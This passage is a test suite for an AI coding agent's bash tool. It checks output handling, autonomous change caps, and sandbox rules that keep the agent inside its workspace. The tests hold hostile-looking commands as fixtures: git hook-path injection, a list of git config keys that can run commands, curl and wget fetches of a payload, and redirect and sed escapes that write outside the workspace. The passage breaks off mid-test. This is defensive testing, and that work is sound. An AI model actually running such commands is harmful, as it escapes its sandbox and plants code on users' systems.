import { describe, expect, test, vi } from "vitest"
import fs from "fs/promises"
import path from "path"
import { execFile } from "node:child_process"
import { promisify } from "node:util"
import { BashTool } from "../../src/tool/bash"
import { Instance } from "../../src/project/instance"
import { Filesystem } from "../../src/util/filesystem"
import { tmpdir } from "../fixture/fixture"
import type { Permission } from "../../src/permission"
import { Truncate } from "../../src/tool/truncate"
import { Isolation } from "../../src/isolation"
import { SessionID, MessageID } from "../../src/session/schema"
import { BlastRadius } from "../../src/session/blast-radius"
import { Plugin } from "../../src/plugin"

const execFileAsync = promisify(execFile)

const ctx = {
  sessionID: SessionID.make("ses_test"),
  messageID: MessageID.make(""),
  callID: "",
  agent: "build",
  abort: AbortSignal.any([]),
  messages: [],
  metadata: () => {},
  ask: async (_req?: PermissionRequest) => {},
}

const projectRoot = path.join(__dirname, "../..")

function shellQuote(value: string) {
  return `'${value.replaceAll("'", "'\\''")}'`
}

async function withAutonomous<T>(fn: () => Promise<T>): Promise<T> {
  const original = process.env.AX_CODE_AUTONOMOUS
  process.env.AX_CODE_AUTONOMOUS = "true"
  try {
    return await fn()
  } finally {
    if (original === undefined) delete process.env.AX_CODE_AUTONOMOUS
    else process.env.AX_CODE_AUTONOMOUS = original
  }
}

type PermissionRequest = Omit<Permission.Request, "id" | "sessionID" | "tool">

describe("tool.bash", () => {
  test("basic", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          {
            command: "echo 'test'",
            description: "Echo test message",
          },
          ctx,
        )
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.output).toContain("test")
      },
    })
  })

  test("preserves interleaved UTF-8 sequences split across foreground stream chunks", async () => {
    await using tmp = await tmpdir({
      init: async (dir) => {
        await fs.writeFile(
          path.join(dir, "split-output.cjs"),
          `
const pause = () => new Promise((resolve) => setTimeout(resolve, 100))
;(async () => {
  process.stdout.write(Buffer.from([0xe2]))
  await pause()
  process.stderr.write(Buffer.from([0xf0, 0x9f]))
  await pause()
  process.stdout.write(Buffer.from([0x82, 0xac]))
  await pause()
  process.stderr.write(Buffer.from([0x99, 0x82]))
})()
`,
        )
      },
    })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          { command: `"${process.execPath}" split-output.cjs`, description: "Decode split output" },
          ctx,
        )
        expect(result.metadata.exit).toBe(0)
        expect(result.output).toBe(String.fromCodePoint(0x20ac, 0x1f642))
        expect(result.metadata.hang.outputBytes).toBe(7)
      },
    })
  })

  test.each([
    { partial: false, overflow: false },
    { partial: false, overflow: true },
    { partial: true, overflow: true },
  ])("handles hard-cap output (partial=$partial, overflow=$overflow)", async ({ partial, overflow }) => {
    const cap = 10 * 1024 * 1024
    await using tmp = await tmpdir({
      init: async (dir) => {
        await fs.writeFile(
          path.join(dir, "capped-output.cjs"),
          `
const first = Buffer.alloc(${cap}, 0x61)
${partial ? "first[first.length - 1] = 0xe2" : ""}
process.stdout.write(first, () => {
  ${overflow ? `setTimeout(() => process.stdout.write(Buffer.from(${partial ? "[0x82, 0xac]" : "[0x62]"})), 100)` : ""}
})
`,
        )
      },
    })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          { command: `"${process.execPath}" capped-output.cjs`, description: "Exercise hard output cap" },
          ctx,
        )
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.hang.outputTruncated).toBe(overflow)
        expect(result.metadata.hang.outputBytes).toBe(cap + (overflow ? (partial ? 2 : 1) : 0))
        expect("fullOutputPath" in result.metadata).toBe(true)
        if (!("fullOutputPath" in result.metadata)) throw new Error("Missing saved output")
        const output = await fs.readFile(result.metadata.fullOutputPath, "utf8")
        expect(output).toBe("a".repeat(cap - (partial ? 1 : 0)) + (overflow ? "\n\n[output truncated at 10MB]" : ""))
      },
    })
  })

  test("flushes incomplete foreground UTF-8 at real EOF", async () => {
    await using tmp = await tmpdir({
      init: async (dir) => {
        await fs.writeFile(path.join(dir, "incomplete-output.cjs"), "process.stdout.write(Buffer.from([0xe2]))")
      },
    })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          { command: `"${process.execPath}" incomplete-output.cjs`, description: "Flush incomplete output" },
          ctx,
        )
        expect(result.metadata.exit).toBe(0)
        expect(result.output).toBe(String.fromCodePoint(0xfffd))
        expect(result.metadata.hang.outputTruncated).toBe(false)
      },
    })
  })

  test("returns structured hang metadata on timeout", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const command = `"${process.execPath}" -e "setTimeout(() => {}, 1000)"`
        const result = await bash.execute(
          {
            command,
            timeout: "50" as any,
            description: "Wait past timeout",
          },
          ctx,
        )
        const hang = result.metadata.hang as Record<string, unknown>
        expect(hang["timedOut"]).toBe(true)
        expect(hang["timeoutMs"]).toBe(50)
        expect(hang["processId"]).toBeTypeOf("number")
        expect(hang["killStartedAt"]).toBeTypeOf("number")
        expect(result.output).toContain("bash tool terminated command after exceeding timeout 50 ms")
      },
    })
  })

  test("swallows metadata publish failures from stream callbacks", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        let metadataCalls = 0
        const noisyCtx = {
          ...ctx,
          metadata: () => {
            metadataCalls++
            throw new Error("metadata transport closed")
          },
        }
        const result = await bash.execute(
          {
            command: "echo 'test'",
            description: "Echo test message",
          },
          noisyCtx,
        )
        expect(metadataCalls).toBeGreaterThan(0)
        expect(result.metadata.exit).toBe(0)
        expect(result.metadata.output).toContain("test")
      },
    })
  })
})

describe("tool.bash permissions", () => {
  test("does not ask for bash permission when command is cd only", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const requests: PermissionRequest[] = []
        await bash.execute(
          {
            command: "cd .",
            description: "Stay in current directory",
          },
          {
            ...ctx,
            ask: async (req: PermissionRequest) => {
              requests.push(req)
            },
          },
        )
        const bashReq = requests.find((r) => r.permission === "bash")
        expect(bashReq).toBeUndefined()
      },
    })
  })
})

describe("tool.bash truncation", () => {
  test("binary cp does not consume the autonomous line cap", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_binary_cp")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5, files: 100 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const source = path.join(tmp.path, "sdluatex")
            const dest = path.join(tmp.path, "copied")
            await fs.writeFile(source, Buffer.concat([Buffer.from("ELF"), Buffer.alloc(997, 0)]))

            const result = await bash.execute(
              {
                command: `cp ${shellQuote(source)} ${shellQuote(dest)}`,
                description: "Copy extensionless binary",
              },
              { ...ctx, sessionID },
            )

            expect(result.metadata.exit).toBe(0)
            const state = BlastRadius.get(sessionID)
            expect(state.lines).toBe(0)
            expect(state.files.size).toBe(1)
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("binary cp still participates in autonomous file-cap accounting", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_binary_file_cap")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5, files: 0 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const source = path.join(tmp.path, "sdluatex")
            const dest = path.join(tmp.path, "copied")
            await fs.writeFile(source, Buffer.concat([Buffer.from("ELF"), Buffer.alloc(997, 0)]))

            await expect(
              bash.execute(
                {
                  command: `cp ${shellQuote(source)} ${shellQuote(dest)}`,
                  description: "Copy extensionless binary under file cap",
                },
                { ...ctx, sessionID },
              ),
            ).rejects.toMatchObject({
              data: { message: expect.stringContaining("Autonomous file-change cap reached") },
            })
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius uses file-size estimate instead of one line per file", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_estimate")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const target = path.join(tmp.path, "large.txt")
            const script = "process.stdout.write('x'.repeat(1000))"
            let caught: unknown

            try {
              await bash.execute(
                {
                  command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(target)}`,
                  description: "Write large redirected file",
                },
                { ...ctx, sessionID },
              )
            } catch (error) {
              caught = error
            }

            expect(caught).toBeInstanceOf(Error)
            expect((caught as { data?: { message?: string } }).data?.message).toContain(
              "Autonomous line-change cap reached",
            )
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius ignores timeout-killed commands", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_blast_timeout")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { lines: 5 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const target = path.join(tmp.path, "large.txt")
            const script = "process.stdout.write('x'.repeat(1000)); setTimeout(() => {}, 1000)"
            const result = await bash.execute(
              {
                command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(target)}`,
                timeout: 1,
                description: "Timeout redirected writer",
              },
              { ...ctx, sessionID },
            )

            expect((result.metadata.hang as Record<string, unknown>)["timedOut"]).toBe(true)
            expect(result.output).toContain("bash tool terminated command after exceeding timeout 1 ms")
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("redirect blast radius surfaces inaccessible output files", async () => {
    if (process.platform === "win32") return

    await using tmp = await tmpdir({ git: true })
    const locked = path.join(tmp.path, "locked")
    await fs.mkdir(locked, { recursive: true })

    try {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const script = "chmod 000 locked"

          await expect(
            bash.execute(
              {
                command: `sh -c ${shellQuote(script)} > locked/out.txt`,
                description: "Write and lock redirected file",
              },
              ctx,
            ),
          ).rejects.toMatchObject({ code: "EACCES" })
        },
      })
    } finally {
      await fs.chmod(locked, 0o700).catch(() => {})
    }
  })

  test("redirect blast radius treats ENOTDIR output stats as missing", async () => {
    await using tmp = await tmpdir({ git: true })
    const dir = path.join(tmp.path, "target")
    const output = path.join(dir, "out.txt")
    await fs.mkdir(dir, { recursive: true })

    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_redirect_enotdir")
      BlastRadius.reset(sessionID)
      try {
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const script = [
              "const fs = require('fs')",
              `fs.rmSync(${JSON.stringify(output)})`,
              `fs.rmdirSync(${JSON.stringify(dir)})`,
              `fs.writeFileSync(${JSON.stringify(dir)}, 'not a directory')`,
            ].join(";")

            const result = await bash.execute(
              {
                command: `${shellQuote(process.execPath)} -e ${shellQuote(script)} > ${shellQuote(output)}`,
                description: "Replace redirect parent with file",
              },
              { ...ctx, sessionID },
            )

            expect(result.metadata.exit).toBe(0)
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("input redirect is not treated as an autonomous write", async () => {
    await using tmp = await tmpdir({
      git: true,
      init: async (dir) => {
        await fs.writeFile(path.join(dir, ".env"), "SECRET=ok\n")
      },
    })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_input_redirect")
      BlastRadius.reset(sessionID)
      try {
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()
            const result = await bash.execute(
              {
                command: "cat < .env",
                description: "Read dotenv via input redirect",
              },
              { ...ctx, sessionID },
            )

            expect(result.metadata.exit).toBe(0)
            expect(result.output).toContain("SECRET=ok")
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("git config write to a dangerous key is blocked in autonomous mode even behind a global git flag", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_git_config_global_flag")
      BlastRadius.reset(sessionID)
      try {
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()

            // A leading global git flag (`-c key=value`) must not let a
            // `git config core.hooksPath ...` write slip past the
            // non-overridable .git/config protected-path check — the
            // subcommand must be located by skipping git's own global
            // flags, not by reading args[0] directly.
            await expect(
              bash.execute(
                {
                  command: "git -c protocol.ext.allow=always config core.hooksPath ./evil-hooks",
                  description: "git config with a leading global flag",
                },
                { ...ctx, sessionID },
              ),
            ).rejects.toMatchObject({
              message: expect.stringContaining("non-overridable protected path"),
            })
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test.each([
    "git config set core.hooksPath ./evil-hooks",
    "git config -- core.hooksPath --get",
    `bash -c "git config 'core.hooksPath' ./evil-hooks"`,
    `bash -c "'git' config core.hooksPath ./evil-hooks"`,
    `bash -c "env git config core.hooksPath ./evil-hooks"`,
  ])("blocks dangerous config writes with alternate syntax: %s", async (command) => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(bash.execute({ command, description: "Reject hook injection" }, ctx)).rejects.toThrow(
            /non-overridable protected path/,
          )
          expect(await fs.readFile(path.join(tmp.path, ".git", "config"), "utf8")).not.toContain("hooksPath")
        },
      })
    })
  })

  test.each([
    "credential.https://example.invalid.helper",
    "CrEdEnTiAl.https://example.invalid.HeLpEr",
    "diff.fixture.command",
    "diff.fixture.textconv",
    "merge.fixture.driver",
    "difftool.fixture.cmd",
    "difftool.fixture.path",
    "mergetool.fixture.cmd",
    "mergetool.fixture.path",
    "browser.fixture.cmd",
    "browser.fixture.path",
    "man.fixture.cmd",
    "man.fixture.path",
    "guitool.fixture.cmd",
    "trailer.fixture.cmd",
    "trailer.fixture.command",
    "gpg.ssh.program",
    "gpg.ssh.defaultKeyCommand",
    "core.askPass",
    "core.gitProxy",
    "core.alternateRefsCommand",
    "interactive.diffFilter",
    "sendemail.ccCmd",
    "sendemail.toCmd",
    "sendemail.headerCmd",
    "sendemail.sendmailCmd",
    "sendemail.fixture.sendmailCmd",
    "remote.origin.uploadpack",
    "remote.origin.receivepack",
    "remote.origin.vcs",
    "imap.tunnel",
    "instaweb.httpd",
  ])("blocks command-bearing Git config key %s", async (key) => {
    await using tmp = await tmpdir({ git: true })
    const configPath = path.join(tmp.path, ".git", "config")
    const before = await fs.readFile(configPath, "utf8")
    await withAutonomous(async () => {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute(
              { command: `git config ${key} fixture-command`, description: "Reject executable configuration" },
              ctx,
            ),
          ).rejects.toThrow(/non-overridable protected path/)
          expect(await fs.readFile(configPath, "utf8")).toBe(before)
        },
      })
    })
  })

  test.each([
    "credential.https://example.invalid.username",
    "diff.fixture.wordRegex",
    "merge.fixture.name",
    "trailer.fixture.key",
    "remote.origin.url",
  ])("allows non-executable Git config key %s", async (key) => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const result = await bash.execute(
            { command: `git config ${key} fixture-value`, description: "Set ordinary configuration" },
            ctx,
          )
          expect(result.metadata.exit).toBe(0)
          const stored = await execFileAsync("git", ["-C", tmp.path, "config", "--get", key])
          expect(stored.stdout.trim()).toBe("fixture-value")
        },
      })
    })
  })

  test.each([
    { args: "sendemail.smtpServer /tmp/fixture-sendmail", blocked: true },
    { args: "set sendemail.fixture.smtpServer /tmp/fixture-sendmail", blocked: true },
    { args: "--add sendemail.smtpServer /tmp/fixture-sendmail", blocked: true },
    { args: "sendemail.smtpServer ~/fixture-sendmail", blocked: true },
    { args: "sendemail.smtpServer smtp.example.invalid", blocked: false },
    { args: "set sendemail.fixture.smtpServer smtp.example.invalid", blocked: false },
    { args: "submodule.fixture.update '!printf fixture'", blocked: true },
    { args: "set submodule.fixture.update '!printf fixture'", blocked: true },
    { args: "submodule.fixture.update checkout", blocked: false },
    { args: "set submodule.fixture.update rebase", blocked: false },
  ])("guards value-dependent executable settings: $args", async ({ args, blocked }) => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const run = bash.execute(
            { command: `git config ${args}`, description: "Configure transport or update mode" },
            ctx,
          )
          if (blocked) await expect(run).rejects.toThrow(/non-overridable protected path/)
          else expect((await run).metadata.exit).toBe(0)
        },
      })
    })
  })

  test.each(["rename-section", "--rename-section"])("blocks config section injection with %s", async (action) => {
    await using tmp = await tmpdir({ git: true })
    await execFileAsync("git", ["-C", tmp.path, "config", "safe.hooksPath", "./evil-hooks"])
    await withAutonomous(async () => {
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          await expect(
            bash.execute({ command: `git config ${action} safe core`, description: "Reject section injection" }, ctx),
          ).rejects.toThrow(/non-overridable protected path/)
          const result = await execFileAsync("git", ["-C", tmp.path, "config", "--get", "safe.hooksPath"])
          expect(result.stdout.trim()).toBe("./evil-hooks")
        },
      })
    })
  })

  test("inner shell write redirect counts against autonomous blast radius", async () => {
    await using tmp = await tmpdir({ git: true })
    await withAutonomous(async () => {
      const sessionID = SessionID.make("ses_bash_inner_redirect_write")
      BlastRadius.reset(sessionID)
      try {
        BlastRadius.applyConfigCaps(sessionID, { files: 0 })
        await Instance.provide({
          directory: tmp.path,
          fn: async () => {
            const bash = await BashTool.init()

            await expect(
              bash.execute(
                {
                  command: `sh -c ${shellQuote("printf x > inner.txt")}`,
                  description: "Write via inner shell redirect",
                },
                { ...ctx, sessionID },
              ),
            ).rejects.toMatchObject({
              data: { message: expect.stringContaining("Autonomous file-change cap reached") },
            })
          },
        })
      } finally {
        BlastRadius.reset(sessionID)
      }
    })
  })

  test("truncates output exceeding line limit", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const lineCount = Truncate.MAX_LINES + 500
        const result = await bash.execute(
          {
            command: `seq 1 ${lineCount}`,
            description: "Generate lines exceeding limit",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)
        expect((result.metadata as any).originalSize).toBeGreaterThan(0)
        expect((result.metadata as any).truncatedTo).toBeGreaterThan(0)
        expect((result.metadata as any).contentHint).toBeTypeOf("string")
        expect((result.metadata as any).fullOutputPath).toBe((result.metadata as any).outputPath)
        expect(result.output).toContain("truncated")
        expect(result.output).toContain("The tool call succeeded but the output was truncated")
      },
    })
  })

  test("truncates output exceeding byte limit", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const byteCount = Truncate.MAX_BYTES + 10000
        const result = await bash.execute(
          {
            command: `head -c ${byteCount} /dev/zero | tr '\\0' 'a'`,
            description: "Generate bytes exceeding limit",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)
        expect(result.output).toContain("truncated")
        expect(result.output).toContain("The tool call succeeded but the output was truncated")
      },
    })
  })

  test("does not truncate small output", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const result = await bash.execute(
          {
            command: "echo hello",
            description: "Echo hello",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(false)
        expect(result.output).toMatch(/^hello\r?\n$/)
      },
    })
  })

  test("full output is saved to file when truncated", async () => {
    await Instance.provide({
      directory: projectRoot,
      fn: async () => {
        const bash = await BashTool.init()
        const lineCount = Truncate.MAX_LINES + 100
        const result = await bash.execute(
          {
            command: `seq 1 ${lineCount}`,
            description: "Generate lines for file check",
          },
          ctx,
        )
        expect((result.metadata as any).truncated).toBe(true)

        const filepath = (result.metadata as any).outputPath
        expect(filepath).toBeTruthy()

        const saved = await Filesystem.readText(filepath)
        const lines = saved.trim().split("\n")
        expect(lines.length).toBe(lineCount)
        expect(lines[0]).toBe("1")
        expect(lines[lineCount - 1]).toBe(String(lineCount))
      },
    })
  })
})

describe("tool.bash isolation", () => {
  test("rejects redirection target outside workspace in workspace-write mode", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "exfil.txt")
        // The redirect target is outside the workspace; even though
        // `echo` itself is harmless, writing the output anywhere on disk
        // must be sandboxed.
        await expect(
          bash.execute(
            {
              command: `echo pwned > ${outsideFile}`,
              description: "Attempt redirect outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects redirection target inside `bash -c` inner command", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "exfil.txt")
        // The redirect lives inside the quoted `-c` argument and is
        // parsed by the inner tree-sitter pass; outer file_redirect
        // walking misses it.
        await expect(
          bash.execute(
            {
              command: `bash -c "echo pwned > ${outsideFile}"`,
              description: "Attempt redirect outside workspace via bash -c",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects curl output target inside `bash -c` inner command", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "payload.txt")
        await expect(
          bash.execute(
            {
              command: `bash -c "curl -o ${outsideFile} https://example.invalid/payload"`,
              description: "Attempt curl outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects wget -O output target outside workspace", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "payload.txt")
        await expect(
          bash.execute(
            {
              command: `wget -O ${outsideFile} https://example.invalid/payload`,
              description: "Attempt wget outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects interpreter inline absolute path inside `eval`", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }
        const outsideFile = path.join(outerTmp.path, "inline.txt")
        await expect(
          bash.execute(
            {
              command: `eval "python3 -c 'open(\\\"${outsideFile}\\\", \\\"w\\\").write(\\\"x\\\")'"`,
              description: "Attempt python outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
      },
    })
  })

  test("rejects dynamic command substitution redirection target", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }

        await expect(
          bash.execute(
            {
              command: "echo pwned > $(echo /tmp/exfil.txt)",
              description: "Attempt dynamic redirect",
            },
            testCtx,
          ),
        ).rejects.toThrow(/Dynamic redirection targets/)
      },
    })
  })

  test("rejects dynamic command substitution redirection target inside `bash -c`", async () => {
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = {
          ...ctx,
          ask: async () => {},
          extra: { isolation },
        }

        await expect(
          bash.execute(
            {
              command: 'bash -c "echo pwned > $(echo /tmp/exfil.txt)"',
              description: "Attempt inner dynamic redirect",
            },
            testCtx,
          ),
        ).rejects.toThrow(/Dynamic redirection targets/)
      },
    })
  })

  test("rejects relative `..` escape via an unmodeled command (sed -i)", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    const victim = path.join(outerTmp.path, "victim.txt")
    await fs.writeFile(victim, "original\n")
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        const rel = path.relative(tmp.path, victim)
        // `sed` is not in the modeled-command list. A relative `..` path must
        // still be checked against the workspace boundary, otherwise an
        // in-place edit silently mutates a file outside the workspace.
        await expect(
          bash.execute({ command: `sed -i '' 's/original/PWNED/' ${rel}`, description: "Escape via sed" }, testCtx),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        expect(await fs.readFile(victim, "utf8")).toBe("original\n")
      },
    })
  })

  test("rejects git config --file=<outside> write with a benign key", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        const outsideFile = path.join(outerTmp.path, "exfil.cfg")
        // A benign key (user.email) skips the dangerous-key recorder, but the
        // explicit --file target is still a write outside the workspace and
        // must hit the same boundary checks as a shell redirect.
        await expect(
          bash.execute(
            {
              command: `git config --file=${outsideFile} user.email "pwned@example.com"`,
              description: "Attempt git config write outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        // The denial must happen before the command runs.
        await expect(fs.readFile(outsideFile, "utf8")).rejects.toThrow()
      },
    })
  })

  test("rejects git config --file <outside> write with a benign key", async () => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const testCtx = { ...ctx, ask: async () => {}, extra: { isolation } }
        const outsideFile = path.join(outerTmp.path, "exfil.cfg")
        // Same vector with the space-separated --file form.
        await expect(
          bash.execute(
            {
              command: `git config --file ${outsideFile} user.email "pwned@example.com"`,
              description: "Attempt git config write outside workspace",
            },
            testCtx,
          ),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        await expect(fs.readFile(outsideFile, "utf8")).rejects.toThrow()
      },
    })
  })

  test.each(["attached-file", "option-like-value"])("rejects external config write with %s", async (syntax) => {
    await using outerTmp = await tmpdir()
    await using tmp = await tmpdir({ git: true })
    const target = path.join(outerTmp.path, "outside.cfg")
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
        const command =
          syntax === "attached-file"
            ? `git config -f${target} user.email escaped@example.com`
            : `git config --file=${target} -- user.name --get`
        await expect(
          bash.execute({ command, description: "Reject external config write" }, { ...ctx, extra: { isolation } }),
        ).rejects.toThrow(/outside workspace boundary|protected/)
        await expect(fs.readFile(target, "utf8")).rejects.toThrow()
      },
    })
  })

  test.each(["--get user.email", "get user.email", "--list", "list", "-l", "user.email"])(
    "allows external config reads with %s",
    async (action) => {
      await using outerTmp = await tmpdir()
      await using tmp = await tmpdir({ git: true })
      const target = path.join(outerTmp.path, "outside.cfg")
      await fs.writeFile(target, "[user]\nemail = reader@example.com\n")
      await Instance.provide({
        directory: tmp.path,
        fn: async () => {
          const bash = await BashTool.init()
          const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
          // Modern subcommands precede their options; legacy actions follow them.
          const modern = action === "list" || action.startsWith("get ")
          const command = modern
            ? `git config ${action.split(" ")[0]} --file=${target} ${action.split(" ").slice(1).join(" ")}`
            : `git config --file=${target} ${action}`
          const result = await bash.execute(
            { command, description: "Read external config" },
            { ...ctx, extra: { isolation } },
          )
          expect(result.metadata.exit).toBe(0)
          expect(result.output).toContain("reader@example.com")
        },
      })
    },
  )

  test("does not interpret a config value as a global git-dir flag", async () => {
    await using outerTmp = await tmpdir({ git: true })
    await using tmp = await tmpdir({ git: true })
    await Instance.provide({
      directory: tmp.path,
      fn: async () => {
        const bash = await BashTool.init()
        const isolation = Isolation.resolve({ mode: "workspace-write", network: false }, tmp.path, tmp.path)
